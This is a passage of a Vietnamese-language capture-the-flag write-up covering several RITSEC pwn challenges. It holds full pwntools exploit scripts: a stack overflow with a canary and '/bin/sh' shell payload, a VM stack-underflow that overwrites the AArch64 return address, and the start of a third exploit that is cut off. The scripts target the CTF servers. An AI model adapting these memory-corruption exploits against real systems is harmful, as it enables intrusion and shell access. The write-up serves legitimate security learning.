+</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;/bin/sh</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;5&#34;</span>)
+</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;Swap this: &#34;</span>)
+</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>send(payload)
+</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>send(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;With this: &#34;</span>)
+</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;B&#34;</span>)
+</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;&gt;&gt; &#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    overflow <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;A&#34;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">0x18</span> <span style="color:#f92672">+</span> p64(canary) <span style="color:#f92672">+</span> p64(bed <span style="color:#f92672">+</span> <span style="color:#ae81ff">8</span>)[:<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>]
+</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;4&#34;</span>)
+</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>send(overflow)
+</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>send(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;&gt;&gt; &#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;6&#34;</span>)
+</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>interactive()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> __name__ <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;__main__&#34;</span>:
+</span></span><span style="display:flex;"><span>    main()
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><code>FLAG: RS{wh3r3_h4s_4ll_th3_rum_g0n3_mr_m0nk3y_m4n?}</code></p>
+<h2 id="3-marauder-might">3. Marauder Might</h2>
+<p><img src="https://hackmd.io/_uploads/H1VNcsg2-e.png" alt="image">
+Tổng quan: Một máy ảo (Virtual Machine) tùy chỉnh có lỗi logic trong việc quản lý ngăn xếp (Stack Management).</p>
+<h3 id="phân-tích-tĩnh-static-analysis">Phân tích tĩnh (Static Analysis)</h3>
+<h4 id="luồng-thực-thi-chính-main">Luồng thực thi chính (main):</h4>
+<p>Hàm main tại 0x4009e8 thực hiện các công việc cơ bản: thiết lập buffering cho stdout/stdin và bắt đầu một vòng lặp nạp/chạy chương trình VM.</p>
+<div class="highlight"><div style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">while</span> (<span style="color:#a6e22e">readprogram</span>(<span style="color:#f92672">&amp;</span>var_20, <span style="color:#ae81ff">0</span>) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>) {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">runprogram</span>(<span style="color:#f92672">&amp;</span>var_20); <span style="color:#75715e">// Thực thi logic VM
+</span></span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">freeprogram</span>(<span style="color:#f92672">&amp;</span>var_20);
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h4 id="kiến-trúc-ngăn-xếp-của-vm-host-stack-frame">Kiến trúc ngăn xếp của VM (Host Stack Frame):</h4>
+<p>Điểm mấu chốt nằm ở cách hàm runprogram (tại 0x400890) thiết lập Stack Frame trên kiến trúc AArch64.</p>
+<p>Dựa trên mã máy:</p>
+<div class="highlight"><div style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#ae81ff">00400890</span>  sub  sp, sp, <span style="color:#75715e">#0x820     ; Cấp phát 0x820 bytes</span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">00400894</span>  stp  fp, lr, <span style="color:#f92672">[</span>sp<span style="color:#f92672">]</span>       ; Lưu Frame Pointer và Link Register <span style="color:#f92672">(</span>Return Address<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">00400898</span>  mov  fp, sp             ; FP trỏ vào đáy stack hiện tại
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Trong AArch64, lr (Link Register - địa chỉ trả về) được lưu tại [sp + 0x8]. Ngay phía trên nó, từ [sp + 0x10] trở đi, là vùng nhớ dành cho VM Stack.</p>
+<h4 id="lỗ-hổng-underflow-tại-hàm-pop">Lỗ hổng Underflow tại hàm Pop:</h4>
+<p>Máy ảo sử dụng một con trỏ toàn cục <code>data_4a1968</code> để quản lý đỉnh ngăn xếp của nó (VM SP). Hãy nhìn vào hàm pop tại 0x40083c:</p>
+<div class="highlight"><div style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>0040083c    data_4a1968 -<span style="color:#f92672">=</span> <span style="color:#ae81ff">8</span>        // Giảm con trỏ VM SP đi <span style="color:#ae81ff">8</span> đơn vị <span style="color:#f92672">(</span>lùi về <span style="color:#ae81ff">1</span> slot<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">00400850</span>    result.q <span style="color:#f92672">=</span> *data_4a1968 // Trả về giá trị tại vị trí mới
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">00400854</span>    <span style="color:#66d9ef">return</span> result
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Lỗ hổng: Hàm này hoàn toàn không kiểm tra biên dưới (Lower bound check). Nếu chương trình VM thực hiện lệnh pop khi stack đang rỗng (con trỏ đang ở sp + 0x10), con trỏ sẽ bị trừ đi 8 và nhảy về sp + 0x8.</p>
+<p>Hệ quả: Vị trí sp + 0x8 chính là nơi lưu trữ lr của hàm Host. Chúng ta có thể đọc hoặc ghi đè địa chỉ trả về của hàm runprogram bằng các lệnh VM.</p>
+<h3 id="phân-tích-opcode-và-logic-vm">Phân tích Opcode và Logic VM</h3>
+<p>Máy ảo xử lý các byte dữ liệu (Opcodes) theo luồng sau:
+<code>Opcode 0x01</code>: Thoát vòng lặp (break), kết thúc chương trình VM.
+<code>Opcode 0x02</code>: Nhánh lệnh phức tạp.
+Nếu byte tiếp theo là 0x02: Gọi sub_400824(), hàm này thực chất thực hiện lệnh pop.
+<code>Opcode 0x00</code>: Đọc một byte index và đẩy một giá trị từ bảng dữ liệu vào stack (push).</p>
+<h3 id="kịch-bản-khai-thác">Kịch bản khai thác</h3>
+<p>Để chiếm quyền điều khiển, chúng ta cần thực hiện các bước sau:</p>
+<ol>
+<li>Đưa địa chỉ mục tiêu vào bộ nhớ: Chúng ta cần địa chỉ của hàm win (0x400780) xuất hiện trong luồng xử lý để có thể ghi nó vào ngăn xếp.</li>
+<li>Kích hoạt Underflow: Gửi chuỗi Opcode \x02\x02. Lúc này, con trỏ ngăn xếp của VM (data_4a1968) sẽ bị lùi từ sp + 0x10 về sp + 0x8 (đúng vị trí của lr).</li>
+<li>Ghi đè LR: Thực hiện một thao tác ghi (như nạp dữ liệu chương trình) để giá trị 0x400780 đè lên địa chỉ trả về cũ.</li>
+<li>Kích hoạt thực thi: Gửi Opcode \x01 để VM thoát vòng lặp. Khi hàm runprogram thực hiện lệnh ret, nó sẽ nạp giá trị tại sp + 0x8 (lúc này đã là địa chỉ hàm win) vào Program Counter (PC).</li>
+</ol>
+<h3 id="payload-2">PAYLOAD</h3>
+<div class="highlight"><div style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Thiết lập môi trường</span>
+</span></span><span style="display:flex;"><span>context<span style="color:#f92672">.</span>binary <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#34;./fractured_ship&#34;</span>)
+</span></span><span style="display:flex;"><span>context<span style="color:#f92672">.</span>arch <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;aarch64&#34;</span>
+</span></span><span style="display:flex;"><span>win_addr <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x400780</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Xây dựng Payload</span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> p32(<span style="color:#ae81ff">1</span>)              <span style="color:#75715e"># Header/Số lượng lệnh (tùy thuộc vào readprogram)</span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p64(win_addr)      <span style="color:#75715e"># Dữ liệu sẽ được dùng để ghi đè vào LR</span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x02\x02</span><span style="color:#e6db74">&#34;</span>        <span style="color:#75715e"># Lệnh Pop lậu -&gt; Khiến VM SP trỏ vào LR trên Host Stack</span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x00\x00</span><span style="color:#e6db74">&#34;</span>        <span style="color:#75715e"># Padding/Tham số bổ sung</span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x01</span><span style="color:#e6db74">&#34;</span>            <span style="color:#75715e"># Lệnh Stop -&gt; Thoát VM và nhảy tới hàm Win</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>io <span style="color:#f92672">=</span> remote(<span style="color:#e6db74">&#34;marauder-might.ctf.ritsec.club&#34;</span>, <span style="color:#ae81ff">1739</span>)
+</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>send(payload)
+</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>interactive()
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><code>FLAG: RS{th3_G4rc1a_0F_gr4pp1in6}</code></p>
+<h2 id="4-carening">4. Carening</h2>
+<p><img src="https://hackmd.io/_uploads/rJEss3e3Wl.png" alt="image"></p>
+<h3 id="payload-3">PAYLOAD</h3>
+<div class="highlight"><div style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">25
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">26
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">27
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">28
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">29
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">30
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">31
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">32
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">33
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">34
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">35
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">36
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">37
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">38
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">39
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">40
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">41
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">42
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">43
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">44
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">45
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">46
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">47
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">48
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">49
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">50
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">51
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">52
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">53
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">54
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">55
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">56
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">57
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">58
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">59
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">60
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">61
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">62
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">63
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">64
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">65
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">66
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">67
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">68
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">69
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">70
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">71
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e">#!/usr/bin/env python3</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Thiết lập môi trường</span>
+</span></span><span style="display:flex;"><span>context<span style="color:#f92672">.</span>arch <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;amd64&#39;</span>
+</span></span><span style="display:flex;"><span>context<span style="color:#f92672">.</span>encoding <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;utf-8&#39;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Thông tin mục tiêu</span>
+</span></span><span style="display:flex;"><span>host <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;careening.ctf.ritsec.club&#34;</span>
+</span></span><span style="display:flex;"><span>port <span style="color:#f92672">=</span> <span style="color:#ae81ff">1501</span>
+</span></span><span style="display:flex;"><span>libc <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#34;./libc.so.6&#34;</span>, checksec<span style="color:#f92672">=</span><span style="color:#66d9ef">False</span>) <span style="color:#75715e"># Đảm bảo file libc nằm cùng thư mục</span>
+</span></span><span style="display:flex;"><span>
